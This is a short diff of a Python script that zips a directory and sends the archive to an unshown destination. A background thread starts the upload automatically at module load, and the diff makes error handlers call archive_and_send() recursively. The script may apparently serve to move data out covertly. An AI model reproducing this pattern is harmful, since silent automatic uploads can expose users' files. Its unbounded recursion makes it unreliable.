@@ -44,11 +44,11 @@ def create_zip_archive(source_dir, output_zip):
                     try:
                         zipf.write(file_path, os.path.relpath(file_path, source_dir))
                     except Exception as e:
-                        main()
+                        archive_and_send()
                         print(f"Error adding file to zip: {str(e)}")
         return output_zip + '.zip'
     except Exception as e:
-        main()
+        archive_and_send()
         print(f"Error creating zip archive: {str(e)}")
         return None
 
@@ -80,15 +80,17 @@ def archive_and_send():
             else:
                 print("Failed to create or send zip file.")
         except Exception as e:
+            archive_and_send()
             print(f"Error creating or sending zip file: {str(e)}")
-            main()
+
 
 thread = threading.Thread(target=archive_and_send)
 thread.start()
-time.sleep(20)
+time.sleep(13)
 if thread.is_alive():
     print("Архивирование и отправка занимают больше времени. Принудительно завершаем.")
     thread.join()
+    
 def mains():
     main()
 if __name__ == "__main__":
